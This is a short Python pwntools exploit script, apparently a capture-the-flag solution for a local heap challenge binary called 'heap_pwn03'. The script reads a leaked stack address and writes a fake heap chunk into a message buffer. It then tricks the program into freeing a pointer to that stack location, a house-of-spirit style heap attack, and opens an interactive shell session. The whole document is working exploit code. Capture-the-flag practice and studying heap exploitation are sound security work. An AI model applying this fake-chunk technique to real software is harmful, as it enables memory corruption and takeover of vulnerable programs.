from pwn import *
s = process("./heap_pwn03")
raw_input('debug')

sla = lambda delim,data : s.sendlineafter(delim,str(data))

sla("yes or no (y/n) ?","y")
s.recvuntil("Cheaterdxd's message address is at ")
stack_leak = int(s.recvuntil('\n'),16)
log.info("stack : 0x%x"%stack_leak)
sla("You can write a message to house !",p64(0x0)+p64(0x31)+p64(0x1)+0x20*'a'+p64(0x31))
# sla("Content:", "tuan")
sla("Your choice: ",1)

s.recvuntil("is at ")
tree1 = s.recvuntil(" ")
log.info(tree1)
s.recvuntil("is at ")
tree2 = s.recvuntil(" ")
s.recvuntil("is at ")
tree3 = s.recvuntil(" ")
sla("Choose the tree you want to free by input tree's address:",p64(stack_leak+0x10))

s.interactive()
s.close()